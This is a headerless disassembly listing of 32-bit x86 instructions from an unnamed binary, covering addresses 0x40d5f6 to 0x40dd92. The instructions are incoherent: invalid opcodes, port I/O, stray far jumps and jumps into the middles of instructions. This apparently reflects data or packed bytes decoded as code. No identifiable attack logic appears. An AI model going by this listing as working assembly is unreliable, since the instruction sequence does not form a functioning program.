  40d5f6:	jl     0x40d643
  40d5f8:	mov    eax,0xb7201e51
  40d5fd:	mov    ds:0xc3bff9,al
  40d602:	mov    eax,0x390079e1
  40d607:	aas    
  40d608:	ins    BYTE PTR es:[edi],dx
  40d609:	loope  0x40d5b3
  40d60b:	fwait
  40d60c:	add    BYTE PTR [ebp-0x80],dh
  40d60f:	retf   
  40d610:	mov    dh,al
  40d612:	ficomp WORD PTR [edx]
  40d614:	stc    
  40d615:	inc    edi
  40d616:	cmp    eax,0xf52b5137
  40d61b:	les    ebp,FWORD PTR [ebp+eiz*2-0x54]
  40d61f:	in     eax,0x34
  40d621:	jl     0x40d636
  40d623:	push   eax
  40d624:	xchg   BYTE PTR [ebp+eax*4-0x78],ah
  40d628:	frstor [esi*4+0x740d3d19]
  40d62f:	stos   DWORD PTR es:[edi],eax
  40d630:	retf   
  40d631:	nop
  40d632:	mov    edx,0x8b67b354
  40d637:	and    edi,DWORD PTR [esi+0x5a]
  40d63a:	push   eax
  40d63b:	cmp    al,0x28
  40d63d:	mov    cl,BYTE PTR [edx-0x177e2bf3]
  40d643:	loop   0x40d6a1
  40d645:	int3   
  40d646:	sub    al,cl
  40d648:	aam    0xfc
  40d64a:	ss mov ah,0xac
  40d64d:	sub    DWORD PTR [ebx+0x3723b6a],0x5d47ba83
  40d657:	fstp   QWORD PTR ds:0x7f750f2d
  40d65d:	push   ss
  40d65e:	inc    esp
  40d65f:	in     eax,dx
  40d660:	daa    
  40d661:	inc    edi
  40d662:	push   esi
  40d663:	in     eax,dx
  40d664:	fld    QWORD PTR [ecx]
  40d666:	mov    edi,0x61ee1d10
  40d66b:	fnstsw WORD PTR [eax-0x443051f]
  40d671:	sub    eax,0xc2dac5ed
  40d676:	stos   BYTE PTR es:[edi],al
  40d677:	fldcw  WORD PTR [esi+0x6c4c99f4]
  40d67d:	pop    esi
  40d67e:	mov    esp,0x7cf8ee84
  40d683:	pop    ebx
  40d684:	mov    al,0x5e
  40d686:	add    ecx,ebp
  40d688:	into   
  40d689:	xchg   edx,eax
  40d68a:	loop   0x40d661
  40d68c:	and    BYTE PTR [esi],0xe2
  40d68f:	push   ss
  40d690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d691:	(bad)  
  40d692:	call   0x5b1526a9
  40d697:	lahf   
  40d698:	add    DWORD PTR [edi-0x630d3427],eax
  40d69e:	push   ds
  40d69f:	ret    
  40d6a0:	stos   DWORD PTR es:[edi],eax
  40d6a1:	inc    ecx
  40d6a2:	add    DWORD PTR [ebp-0xe],ebx
  40d6a5:	xor    DWORD PTR [ecx-0x3291e624],ebp
  40d6ab:	lahf   
  40d6ac:	rol    DWORD PTR [ecx],1
  40d6ae:	or     al,0x55
  40d6b0:	sbb    eax,0xb10fc51e
  40d6b5:	xchg   DWORD PTR [eax],edx
  40d6b7:	inc    ecx
  40d6b8:	add    BYTE PTR [ecx+0xc],dl
  40d6bb:	enter  0xa255,0x2
  40d6bf:	jne    0x40d733
  40d6c1:	icebp  
  40d6c2:	sub    eax,DWORD PTR [edx]
  40d6c4:	xor    eax,0x2f0c9ba1
  40d6c9:	je     0x40d6e6
  40d6cb:	mov    ch,0xba
  40d6cd:	dec    esi
  40d6ce:	or     DWORD PTR [esi-0x291281f7],ecx
  40d6d4:	nop
  40d6d5:	fimul  DWORD PTR [edx-0x21fee782]
  40d6db:	fidiv  DWORD PTR [ecx]
  40d6dd:	and    bh,BYTE PTR ds:0xb7551126
  40d6e3:	cld    
  40d6e4:	xor    ah,BYTE PTR [edi+0x3c]
  40d6e7:	inc    ebp
  40d6e8:	in     eax,0x9b
  40d6ea:	sbb    ebx,DWORD PTR [ebx+0x1c]
  40d6ed:	jg     0x40d6c6
  40d6ef:	adc    BYTE PTR [edx],bh
  40d6f1:	jle    0x40d67e
  40d6f3:	or     edi,DWORD PTR [ecx+eax*4]
  40d6f6:	dec    esi
  40d6f7:	dec    edi
  40d6f8:	mov    BYTE PTR [ebx-0x3040fbb],al
  40d6fe:	rcr    DWORD PTR ds:0xb5677fc6,cl
  40d704:	pop    ecx
  40d705:	inc    ecx
  40d706:	or     cl,bh
  40d708:	push   0xffffffdd
  40d70a:	jbe    0x40d761
  40d70c:	mov    al,ds:0xc7a0e267
  40d711:	jne    0x40d6ed
  40d713:	or     DWORD PTR [eax],0xa832e33
  40d719:	jns    0x40d6f4
  40d71b:	and    BYTE PTR [edi+0x0],dl
  40d71e:	xor    al,0x34
  40d720:	mov    cl,0xf9
  40d722:	xor    edi,esp
  40d724:	in     eax,dx
  40d725:	das    
  40d726:	retf   
  40d727:	and    al,0xd8
  40d729:	xchg   ebx,eax
  40d72a:	popa   
  40d72b:	fld    QWORD PTR ds:0x3eb33d12
  40d731:	jo     0x40d721
  40d733:	fldcw  WORD PTR [eax+0x26]
  40d736:	dec    ecx
  40d737:	and    eax,ebx
  40d739:	or     al,0x95
  40d73b:	test   BYTE PTR [edi+edi*1-0x5ad75aa0],al
  40d742:	(bad)  
  40d743:	(bad)  
  40d744:	or     al,0xf4
  40d746:	repnz ror ebx,1
  40d749:	dec    edx
  40d74a:	adc    dh,dh
  40d74c:	pop    eax
  40d74d:	stc    
  40d74e:	sbb    eax,DWORD PTR [esi-0x7da60824]
  40d754:	icebp  
  40d755:	aas    
  40d756:	jl     0x40d7b4
  40d758:	push   ecx
  40d759:	mov    ebx,0x5053cb0f
  40d75e:	push   esp
  40d75f:	mov    gs:0x5f23aa2a,eax
  40d765:	adc    al,0xd5
  40d767:	jecxz  0x40d782
  40d769:	jecxz  0x40d76c
  40d76b:	pusha  
  40d76c:	cld    
  40d76d:	adc    bl,BYTE PTR [esi*2-0x11c0606b]
  40d774:	call   0x27d8a53c
  40d779:	and    DWORD PTR [eax-0x39],ebx
  40d77c:	xchg   ebp,eax
  40d77d:	sbb    DWORD PTR [ebp+0x45a1f095],ecx
  40d783:	ret    0xd00f
  40d786:	mov    ah,0xad
  40d788:	iret   
  40d789:	inc    edx
  40d78a:	mov    edx,0xcb89ffd0
  40d78f:	add    BYTE PTR [ebx-0x765b2755],bl
  40d795:	shl    DWORD PTR [ecx],cl
  40d797:	call   0x839c:0x511d3a21
  40d79e:	or     DWORD PTR [edi+edi*2],0x6005d5f1
  40d7a5:	psrad  mm2,QWORD PTR [esi+0x42]
  40d7a9:	push   ds
  40d7aa:	lock and esi,DWORD PTR [ebx+esi*8+0xa]
  40d7af:	int3   
  40d7b0:	sbb    BYTE PTR [ecx],bl
  40d7b2:	mov    edi,0x8373c910
  40d7b7:	mov    esi,ebp
  40d7b9:	xchg   ecx,eax
  40d7ba:	and    bh,BYTE PTR [ebx+0x3a370c98]
  40d7c0:	add    BYTE PTR [esi+0x43e029ff],ch
  40d7c6:	rol    DWORD PTR [ebx+0x46],1
  40d7c9:	pop    ebx
  40d7ca:	retf   
  40d7cb:	test   al,0x23
  40d7cd:	or     eax,0xee648fb8
  40d7d2:	xor    eax,0x8b2a4953
  40d7d7:	(bad)  
  40d7d8:	leave  
  40d7d9:	(bad)  
  40d7da:	cs mov ebx,0xdecb2862
  40d7e0:	dec    ebp
  40d7e1:	mov    edx,0xfab1c0b4
  40d7e6:	xor    DWORD PTR [ecx-0x64],edx
  40d7e9:	cdq    
  40d7ea:	add    eax,0x94065a9
  40d7ef:	and    al,0xe7
  40d7f1:	mov    edx,0x3f819be9
  40d7f6:	jl     0x40d85c
  40d7f8:	lds    esp,FWORD PTR [ebx]
  40d7fa:	gs pushf 
  40d7fc:	sar    BYTE PTR [ecx],0xae
  40d7ff:	daa    
  40d800:	fisubr DWORD PTR [edi+0x68332a0d]
  40d806:	jo     0x40d870
  40d808:	mov    ebx,0xa7a91666
  40d80d:	pop    ss
  40d80e:	scas   al,BYTE PTR es:[edi]
  40d80f:	fiadd  DWORD PTR [esi*4+0x1aa36579]
  40d816:	out    dx,eax
  40d817:	cdq    
  40d818:	push   edx
  40d819:	mov    ebp,0x4da7d14c
  40d81e:	repz add BYTE PTR [esi-0x4933e72e],bl
  40d825:	out    dx,eax
  40d826:	outs   dx,BYTE PTR ds:[esi]
  40d827:	lods   al,BYTE PTR ds:[esi]
  40d828:	repz mov ah,0xa9
  40d82b:	fs or  eax,DWORD PTR ss:[eax-0x13]
  40d830:	arpl   WORD PTR [edi+eax*1+0x465ddeba],si
  40d837:	outs   dx,DWORD PTR ds:[esi]
  40d838:	out    0xab,al
  40d83a:	inc    cx
  40d83c:	sbb    DWORD PTR [edx-0x1bb0780d],edx
  40d842:	push   edx
  40d843:	out    0xbd,al
  40d845:	jo     0x40d8b8
  40d847:	je     0x40d80c
  40d849:	or     BYTE PTR [edx+0xf],ch
  40d84c:	mov    bh,0xa6
  40d84e:	repz pop ebx
  40d850:	push   0xfffffff7
  40d852:	jnp    0x40d860
  40d854:	aad    0xfa
  40d856:	jnp    0x40d820
  40d858:	scas   al,BYTE PTR es:[edi]
  40d859:	xor    al,0xf1
  40d85b:	dec    ecx
  40d85c:	pop    edi
  40d85d:	sbb    cl,cl
  40d85f:	in     eax,0xd
  40d861:	cmp    ch,BYTE PTR [edx+0x5f394a41]
  40d867:	add    eax,0x985b5224
  40d86c:	add    DWORD PTR [edi+0x14b1d56d],esp
  40d872:	cdq    
  40d873:	pop    es
  40d874:	loop   0x40d8af
  40d876:	cmp    eax,0xd1b95394
  40d87b:	ss xchg edi,eax
  40d87d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d87e:	and    eax,0x3fb5a4b6
  40d883:	ds jns 0x40d8e9
  40d886:	adc    eax,0x56eab206
  40d88b:	out    dx,eax
  40d88c:	add    edx,DWORD PTR [ebp+0x39]
  40d88f:	je     0x40d8da
  40d891:	push   0x72754eaa
  40d896:	cli    
  40d897:	mov    ah,0x70
  40d899:	arpl   WORD PTR [esi],di
  40d89b:	mov    ebp,DWORD PTR [edx]
  40d89d:	pop    edx
  40d89e:	aam    0xdd
  40d8a0:	jae    0x40d917
  40d8a2:	gs sti 
  40d8a4:	push   ebp
  40d8a5:	xchg   edi,eax
  40d8a6:	pop    ss
  40d8a7:	inc    ebx
  40d8a8:	adc    al,BYTE PTR [edi]
  40d8aa:	dec    esp
  40d8ab:	mov    ebp,esi
  40d8ad:	push   edx
  40d8ae:	mov    ebp,ss
  40d8b0:	sbb    dl,BYTE PTR [ecx+0x6ae675aa]
  40d8b6:	jnp    0x40d8d9
  40d8b8:	or     DWORD PTR [edi-0x33],ebx
  40d8bb:	adc    ah,dh
  40d8bd:	and    ah,ch
  40d8bf:	scas   eax,DWORD PTR es:[edi]
  40d8c0:	pop    ss
  40d8c1:	in     al,0x48
  40d8c3:	dec    edi
  40d8c4:	bound  edx,QWORD PTR [edi-0x57775085]
  40d8ca:	dec    ecx
  40d8cb:	and    BYTE PTR ds:0x7d53b0ae,ch
  40d8d1:	xor    eax,0x5e2878a3
  40d8d6:	push   0x24c6297f
  40d8db:	cmp    BYTE PTR [ebx+0x8],0xd8
  40d8df:	dec    ebx
  40d8e0:	adc    edx,esp
  40d8e2:	xchg   esi,eax
  40d8e3:	dec    esp
  40d8e4:	xchg   ebp,eax
  40d8e5:	repz test al,0xe0
  40d8e8:	or     ecx,ebp
  40d8ea:	test   BYTE PTR ds:0xd7b865e3,cl
  40d8f0:	leave  
  40d8f1:	xor    ebp,esi
  40d8f3:	mov    WORD PTR [eax*1+0x645845d0],es
  40d8fa:	inc    esp
  40d8fb:	lods   eax,DWORD PTR ds:[esi]
  40d8fc:	shl    BYTE PTR [edx-0x77046019],0xae
  40d903:	sbb    eax,0x2689a2d0
  40d908:	popf   
  40d909:	mov    dh,0x2
  40d90b:	dec    esi
  40d90c:	or     esp,DWORD PTR [ebx-0x49]
  40d90f:	xor    al,0x98
  40d911:	daa    
  40d912:	or     eax,0xda32a190
  40d917:	sti    
  40d918:	mov    cl,0x36
  40d91a:	(bad)  [edi+0x4]
  40d91d:	out    dx,al
  40d91e:	idiv   DWORD PTR [esi]
  40d920:	in     al,dx
  40d921:	adc    DWORD PTR [eax-0x76a47b0d],edx
  40d927:	test   DWORD PTR es:[edx-0x77],esp
  40d92b:	je     0xd131d7b7
  40d931:	outs   dx,BYTE PTR ds:[esi]
  40d932:	pop    ebp
  40d933:	xchg   ebx,ebx
  40d935:	je     0x40d949
  40d937:	fidivr DWORD PTR [si+0x33]
  40d93b:	lock (bad) 
  40d93d:	ret    0xa1e4
  40d940:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d941:	cmp    al,0x57
  40d943:	xlat   BYTE PTR ds:[ebx]
  40d944:	data16 loopne 0x40d904
  40d947:	mov    ch,0x95
  40d949:	cwde   
  40d94a:	je     0x40d9b9
  40d94c:	pop    ss
  40d94d:	mov    ah,0x53
  40d94f:	ficom  DWORD PTR [edi-0x2b]
  40d952:	mov    ah,BYTE PTR [eax+0x2eb2975d]
  40d958:	jno    0x40d915
  40d95a:	jmp    0x38fe:0x357ac940
  40d961:	jge    0x40d8e7
  40d963:	pusha  
  40d964:	add    esi,eax
  40d966:	add    BYTE PTR [eax],0xe6
  40d969:	cmp    dh,BYTE PTR [ecx-0x47]
  40d96c:	mov    cl,0xd6
  40d96e:	or     DWORD PTR [ebx+esi*8-0x3d],edi
  40d972:	pop    ebx
  40d973:	scas   eax,DWORD PTR es:[edi]
  40d974:	push   ecx
  40d975:	repz int 0x97
  40d978:	mov    esi,0xe9d416ac
  40d97d:	not    DWORD PTR fs:[edi-0xd401ca9]
  40d984:	and    al,0xf8
  40d986:	mov    ch,0xe7
  40d988:	cmp    BYTE PTR [ecx-0x1bcdc5fc],0x46
  40d98f:	xor    dh,BYTE PTR [ebx-0x53]
  40d992:	jne    0x40d96c
  40d994:	sbb    eax,0x695a991d
  40d999:	sbb    esi,ebx
  40d99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d99c:	arpl   WORD PTR [eax-0x74bbe6cb],di
  40d9a2:	mov    bl,0x7e
  40d9a4:	pop    ss
  40d9a5:	sti    
  40d9a6:	mov    cl,0x29
  40d9a8:	inc    ebx
  40d9a9:	jp     0x40d9b3
  40d9ab:	inc    edx
  40d9ac:	or     ch,BYTE PTR [edi]
  40d9ae:	les    eax,FWORD PTR [eax+0x2]
  40d9b1:	scas   eax,DWORD PTR es:[edi]
  40d9b2:	sub    BYTE PTR [edx-0xf7d017a],0x82
  40d9b9:	(bad)  
  40d9ba:	out    0x17,al
  40d9bc:	sbb    BYTE PTR [ebp-0x1cd834a7],bh
  40d9c2:	or     eax,0x8aa69fe
  40d9c7:	mov    eax,0x7d9b073
  40d9cc:	rcr    dl,cl
  40d9ce:	mov    esi,0xb0878af1
  40d9d3:	add    BYTE PTR [eax+0x8],0x4f
  40d9d7:	inc    ecx
  40d9d8:	addr16 inc ebp
  40d9da:	movhps QWORD PTR [ecx-0x74],xmm5
  40d9de:	jge    0x40d989
  40d9e0:	sub    ch,ch
  40d9e2:	popf   
  40d9e3:	jl     0x40da5e
  40d9e5:	enter  0x256a,0xe6
  40d9e9:	add    eax,0xea469f47
  40d9ee:	sar    BYTE PTR [edi],1
  40d9f0:	mov    esp,0xf4eb4221
  40d9f5:	pop    eax
  40d9f6:	and    esp,DWORD PTR [ebx+0x79]
  40d9f9:	es data16 mov cl,0xc5
  40d9fd:	gs pop ss
  40d9ff:	pop    es
  40da00:	lods   al,BYTE PTR ds:[esi]
  40da01:	sbb    BYTE PTR [edi],ah
  40da03:	aam    0x93
  40da05:	adc    DWORD PTR [ebp-0x4a],edx
  40da08:	arpl   WORD PTR [ecx-0x280a8e37],sp
  40da0e:	lock add ah,BYTE PTR [ebx-0x52139e41]
  40da15:	inc    ebx
  40da16:	cmp    cl,ch
  40da18:	retf   
  40da19:	jo     0x40d9c1
  40da1b:	test   al,0x93
  40da1d:	ffreep st(5)
  40da1f:	mov    dh,0xe7
  40da21:	adc    edx,DWORD PTR [eax+0x510eb002]
  40da27:	jno    0x40d9cb
  40da29:	mov    eax,0x4bf99ebb
  40da2e:	(bad)  
  40da2f:	cmc    
  40da30:	push   cs
  40da31:	cmp    esi,ebp
  40da33:	leave  
  40da34:	inc    edi
  40da35:	jmp    0x8b1c:0x46baaea0
  40da3c:	ret    0x10ae
  40da3f:	sahf   
  40da40:	daa    
  40da41:	sub    edi,DWORD PTR [ecx-0x7417feed]
  40da47:	sub    BYTE PTR [eax+0x28f122f9],ch
  40da4d:	aad    0x4
  40da4f:	sahf   
  40da50:	xor    DWORD PTR fs:[eax],eax
  40da53:	sbb    BYTE PTR [eax-0x79],cl
  40da56:	mov    dl,0x56
  40da58:	shl    BYTE PTR [eax+0x41],0x9b
  40da5c:	fmulp  st(6),st
  40da5e:	mov    ebx,0x89a1794d
  40da63:	add    eax,0x1bdb757f
  40da68:	mov    bl,0xbf
  40da6a:	or     eax,0xe769edd2
  40da6f:	sqrtps xmm4,XMMWORD PTR [eax]
  40da72:	mov    bl,0xa4
  40da74:	xor    eax,0x61c95c77
  40da79:	xchg   ecx,eax
  40da7a:	or     BYTE PTR [ebx+0x42317481],ch
  40da80:	cdq    
  40da81:	pop    ss
  40da82:	mov    al,0x79
  40da84:	aam    0x80
  40da86:	in     eax,dx
  40da87:	xchg   ebx,eax
  40da88:	mov    BYTE PTR [edx],bh
  40da8a:	or     dl,BYTE PTR ds:0x12b7e2c6
  40da90:	scas   eax,DWORD PTR es:[edi]
  40da91:	les    ecx,FWORD PTR [ebp+0x5cf15f87]
  40da97:	idiv   DWORD PTR [eax+0x2cc847aa]
  40da9d:	imul   esp,DWORD PTR [ebx+0x204119ef],0x975c26c6
  40daa7:	dec    ebx
  40daa8:	dec    esp
  40daa9:	das    
  40daaa:	shl    BYTE PTR [esi],1
  40daac:	xchg   DWORD PTR [esp+edx*2],ecx
  40daaf:	jnp    0x40dae4
  40dab1:	push   ecx
  40dab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab3:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40dab5:	or     BYTE PTR [eax],dh
  40dab7:	test   al,0xc2
  40dab9:	in     eax,0x9e
  40dabb:	mov    ds:0xc494bb6e,eax
  40dac0:	push   edx
  40dac1:	enter  0xd5a2,0xef
  40dac5:	cdq    
  40dac6:	pop    edx
  40dac7:	push   ecx
  40dac8:	mov    ds:0x5329b125,eax
  40dacd:	cs pop ecx
  40dacf:	jno    0x40dae4
  40dad1:	sub    al,0xfb
  40dad3:	shr    ebp,0xf6
  40dad6:	inc    esi
  40dad7:	dec    eax
  40dad8:	cmp    DWORD PTR [eax],ebx
  40dada:	div    DWORD PTR [esi+0x61]
  40dadd:	pop    ss
  40dade:	ss hlt 
  40dae0:	mul    DWORD PTR [eax-0x2917d10d]
  40dae6:	pop    ds
  40dae7:	mov    ds:0x77702055,al
  40daec:	out    dx,eax
  40daed:	in     al,dx
  40daee:	jmp    0xffbec37d
  40daf3:	mov    ebx,0x544d91a3
  40daf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daf9:	mov    bl,0xe9
  40dafb:	mov    edi,0xe9c7bca3
  40db00:	cld    
  40db01:	je     0x40db80
  40db03:	ret    0x21b7
  40db06:	je     0x40db7b
  40db08:	and    DWORD PTR ds:0xedc241ed,ecx
  40db0e:	rcr    ebp,1
  40db10:	jecxz  0x40daa2
  40db12:	sub    DWORD PTR [ebp-0x59],esp
  40db15:	adc    dl,bh
  40db17:	push   ss
  40db18:	jecxz  0x40db41
  40db1a:	cmp    DWORD PTR [esi+edx*1+0x32],edi
  40db1e:	aam    0xf7
  40db20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db21:	les    edx,FWORD PTR [edi-0x7146ea6e]
  40db27:	fwait
  40db28:	(bad)  
  40db29:	popa   
  40db2a:	or     cl,BYTE PTR [edi-0x6fd8881d]
  40db30:	mov    cl,0x7d
  40db32:	or     edi,DWORD PTR [ecx-0x49]
  40db35:	ds sti 
  40db37:	enter  0x485,0xb9
  40db3b:	inc    esi
  40db3c:	test   DWORD PTR [ebp-0x31],ecx
  40db3f:	aas    
  40db40:	fstp   QWORD PTR [edx-0x438c317f]
  40db46:	pop    ebp
  40db47:	in     eax,0xa5
  40db49:	stc    
  40db4a:	inc    edi
  40db4b:	inc    eax
  40db4c:	cmp    esp,DWORD PTR [ebp-0x1c]
  40db4f:	dec    eax
  40db50:	rol    DWORD PTR [edx],0xa8
  40db53:	push   edi
  40db54:	test   BYTE PTR [edi+0x21d432af],bl
  40db5a:	cwde   
  40db5b:	std    
  40db5c:	pop    edi
  40db5d:	lds    ebx,FWORD PTR [ebx+0x7c7f2b38]
  40db63:	int3   
  40db64:	dec    ebp
  40db65:	mov    ebx,0xa5c9c730
  40db6a:	into   
  40db6b:	jg     0x40db87
  40db6d:	mov    esp,0x320765e7
  40db72:	stos   DWORD PTR es:[edi],eax
  40db73:	call   0x789b081c
  40db78:	test   BYTE PTR [eax],cl
  40db7a:	iret   
  40db7b:	jge    0x40daff
  40db7d:	popf   
  40db7e:	out    0x64,al
  40db80:	adc    edx,DWORD PTR [edx]
  40db82:	les    edi,FWORD PTR [ebx-0x726cde41]
  40db88:	mov    dl,bl
  40db8a:	or     dl,bh
  40db8c:	leave  
  40db8d:	test   eax,0x3a07ae33
  40db92:	jo     0x40db97
  40db94:	pop    ecx
  40db95:	jmp    0x9f00:0x3507f229
  40db9c:	or     ecx,DWORD PTR [eax+eax*4-0x52dde75b]
  40dba3:	cmp    edi,eax
  40dba5:	cmp    al,0xc3
  40dba7:	xor    DWORD PTR [ecx+0x34],ebx
  40dbaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbab:	xchg   ebx,eax
  40dbac:	push   ebp
  40dbad:	(bad)  
  40dbae:	daa    
  40dbaf:	arpl   sp,bx
  40dbb1:	adc    ch,bl
  40dbb3:	mov    ah,0x6a
  40dbb5:	xor    al,0x49
  40dbb7:	das    
  40dbb8:	mov    eax,ds:0xdac0b362
  40dbbd:	sub    al,0x97
  40dbbf:	test   BYTE PTR es:[eax+ecx*1+0x69],dh
  40dbc4:	test   BYTE PTR [edx],0x1d
  40dbc7:	into   
  40dbc8:	fld    TBYTE PTR ss:[ebx+0x66939cd]
  40dbcf:	inc    ecx
  40dbd0:	jmp    0xfe8bcc71
  40dbd5:	outs   dx,DWORD PTR ds:[esi]
  40dbd6:	mov    esi,0xfe30eb02
  40dbdb:	xor    eax,eax
  40dbdd:	pop    ds
  40dbde:	lods   al,BYTE PTR ds:[esi]
  40dbdf:	jecxz  0x40dc1e
  40dbe1:	mov    esi,ebx
  40dbe3:	adc    edx,DWORD PTR [esi+ebx*1-0x78aecfac]
  40dbea:	repnz sbb al,0x7b
  40dbed:	jecxz  0x40dc60
  40dbef:	mov    esp,0x704bdb8f
  40dbf4:	mov    ebp,DWORD PTR ds:0xb79f8bac
  40dbfa:	faddp  st(1),st
  40dbfc:	sbb    DWORD PTR [ecx+esi*2+0x3417397e],ecx
  40dc03:	push   ebx
  40dc04:	or     ch,ch
  40dc06:	pop    ecx
  40dc07:	push   0x64
  40dc09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0a:	xor    dh,BYTE PTR [eax+0x4c]
  40dc0d:	cdq    
  40dc0e:	repnz pop eax
  40dc10:	mov    al,0xd7
  40dc12:	mov    bh,0x63
  40dc14:	imul   ecx,DWORD PTR [edi],0xffffffb7
  40dc17:	jl     0x40dc6a
  40dc19:	imul   ecx,DWORD PTR [ebx-0x36],0x68
  40dc1d:	cmc    
  40dc1e:	xchg   edx,eax
  40dc1f:	push   ss
  40dc20:	arpl   WORD PTR [edx+ebx*4+0x24],cx
  40dc24:	push   DWORD PTR [ebp-0x4c]
  40dc27:	xor    DWORD PTR [ebx-0x11],ebp
  40dc2a:	out    0x37,eax
  40dc2c:	or     al,0x53
  40dc2e:	test   edi,edx
  40dc30:	cs push esp
  40dc32:	(bad)  
  40dc33:	out    dx,al
  40dc34:	mov    ah,0xdd
  40dc36:	mov    WORD PTR [edx],es
  40dc38:	cmp    DWORD PTR [ebx],edx
  40dc3a:	and    BYTE PTR [ebp+0x45],ah
  40dc3d:	sub    al,0x48
  40dc3f:	pusha  
  40dc40:	rcr    BYTE PTR [ebx],0x4f
  40dc43:	cmp    DWORD PTR [edx+0x42201199],eax
  40dc49:	lock cmp esp,DWORD PTR [ebx-0x36]
  40dc4d:	mov    ebx,0x54cc1ed0
  40dc52:	or     al,dh
  40dc54:	push   ebp
  40dc55:	aas    
  40dc56:	mov    ebp,0xd3d2d2b6
  40dc5b:	push   0xffffffa4
  40dc5d:	ds aad 0xf7
  40dc60:	ds pushf 
  40dc62:	loopne 0x40dcaf
  40dc64:	xchg   edi,eax
  40dc65:	push   edx
  40dc66:	xchg   ecx,eax
  40dc67:	xchg   edi,eax
  40dc68:	(bad)  
  40dc69:	aas    
  40dc6a:	mov    ecx,edx
  40dc6c:	dec    ebp
  40dc6d:	pop    esp
  40dc6e:	push   ecx
  40dc6f:	add    edx,DWORD PTR [ebx-0x11]
  40dc72:	push   0x3bb3d187
  40dc77:	rcr    DWORD PTR ds:0xe543f4fb,cl
  40dc7d:	fnstcw WORD PTR [esi-0x7a]
  40dc80:	dec    BYTE PTR [ebp-0x6c30631f]
  40dc86:	sbb    DWORD PTR [eax-0x591c6080],0xe80431ea
  40dc90:	ret    
  40dc91:	popa   
  40dc92:	xchg   DWORD PTR [ebx],esi
  40dc94:	jnp    0x40dc35
  40dc96:	cmp    BYTE PTR [edx+0x18],ch
  40dc99:	popa   
  40dc9a:	jle    0x40dd0b
  40dc9c:	sub    al,0x55
  40dc9e:	out    0xb1,eax
  40dca0:	jp     0x40dc8c
  40dca2:	mov    al,ds:0x324ec2d3
  40dca7:	fistp  QWORD PTR [edi-0x123c69f6]
  40dcad:	shl    BYTE PTR [esi],0xd8
  40dcb0:	in     eax,dx
  40dcb1:	jmp    0x40dd19
  40dcb3:	push   es
  40dcb4:	outs   dx,DWORD PTR ds:[esi]
  40dcb5:	pop    ebp
  40dcb6:	repz xchg ebp,eax
  40dcb8:	push   esp
  40dcb9:	out    dx,eax
  40dcba:	mov    BYTE PTR [esi-0x1a],al
  40dcbd:	mov    ebp,0x88ad9c0f
  40dcc2:	dec    al
  40dcc4:	in     eax,0x9f
  40dcc6:	jge    0x40dc9e
  40dcc8:	mov    dh,0x4f
  40dcca:	(bad)  
  40dccb:	es leave 
  40dccd:	clc    
  40dcce:	sbb    BYTE PTR [ebx],ah
  40dcd0:	lods   al,BYTE PTR ds:[esi]
  40dcd1:	in     al,0xac
  40dcd3:	add    ah,BYTE PTR [ecx]
  40dcd5:	pushf  
  40dcd6:	hlt    
  40dcd7:	xchg   edx,eax
  40dcd8:	cmp    bl,0xae
  40dcdb:	dec    esp
  40dcdc:	push   ebp
  40dcdd:	repz test eax,0x332a3463
  40dce3:	test   DWORD PTR [ebx+0x57],ebx
  40dce6:	push   ebp
  40dce7:	jmp    0x40dcb8
  40dce9:	dec    ecx
  40dcea:	pop    esi
  40dceb:	cmp    al,0xda
  40dced:	jnp    0x40dd11
  40dcef:	pusha  
  40dcf0:	push   es
  40dcf1:	sub    BYTE PTR [edx-0x4f],bl
  40dcf4:	lds    edi,FWORD PTR [edx+ebx*4+0x614d11a5]
  40dcfb:	cld    
  40dcfc:	push   esp
  40dcfd:	in     al,dx
  40dcfe:	or     al,0x44
  40dd00:	or     esp,edx
  40dd02:	mov    dh,0xaa
  40dd04:	(bad)  
  40dd05:	or     esi,ebp
  40dd07:	ficom  DWORD PTR [edi-0x1d0d84a7]
  40dd0d:	push   esi
  40dd0e:	cdq    
  40dd0f:	retf   
  40dd10:	scas   al,BYTE PTR es:[edi]
  40dd11:	add    esi,eax
  40dd13:	addr16 mov ecx,0x62384d70
  40dd19:	mov    ch,0x1d
  40dd1b:	icebp  
  40dd1c:	or     DWORD PTR [ebp+0x4e],0xf0bacfaa
  40dd23:	xor    al,0x65
  40dd25:	mov    esi,0x4163b202
  40dd2a:	cmp    eax,0xfea44a31
  40dd2f:	dec    ebp
  40dd30:	aaa    
  40dd31:	mov    cl,0xcd
  40dd33:	adc    DWORD PTR [edi+0x3dcd29ca],ebx
  40dd39:	mov    ah,0x9e
  40dd3b:	fwait
  40dd3c:	or     eax,ebp
  40dd3e:	leave  
  40dd3f:	jl     0x40dd24
  40dd41:	push   eax
  40dd42:	jbe    0x40dcf1
  40dd44:	dec    ecx
  40dd45:	jno    0x40dd22
  40dd47:	inc    eax
  40dd48:	lods   eax,DWORD PTR ds:[esi]
  40dd49:	and    bh,BYTE PTR fs:[ebp-0x43b048e1]
  40dd50:	sbb    BYTE PTR [eax-0x304d0707],0xba
  40dd57:	xlat   BYTE PTR ds:[ebx]
  40dd58:	aas    
  40dd59:	add    al,0x4a
  40dd5b:	xor    DWORD PTR [eax-0x31],esp
  40dd5e:	sahf   
  40dd5f:	(bad)
  40dd62:	jle    0x40dd80
  40dd64:	jns    0x40ddaa
  40dd66:	adc    edi,DWORD PTR [ebx+edi*8]
  40dd69:	mov    ds,WORD PTR [esi]
  40dd6b:	shl    BYTE PTR [edi-0x3fd0667b],1
  40dd71:	out    0xe8,al
  40dd73:	test   BYTE PTR [ebx+ebp*1-0x21],cl
  40dd77:	jmp    0x40dd16
  40dd79:	sub    ecx,esi
  40dd7b:	mov    ds,edx
  40dd7d:	cwde   
  40dd7e:	xor    BYTE PTR [ebp-0x58e0e650],ch
  40dd84:	retf   0x1b78
  40dd87:	xchg   ecx,eax
  40dd88:	inc    esp
  40dd89:	fcomp  DWORD PTR [edi-0x5]
  40dd8c:	mov    al,ds:0x961a1cb
  40dd91:	icebp  
  40dd92:	sub    al,BYTE PTR ds:0xc318e353
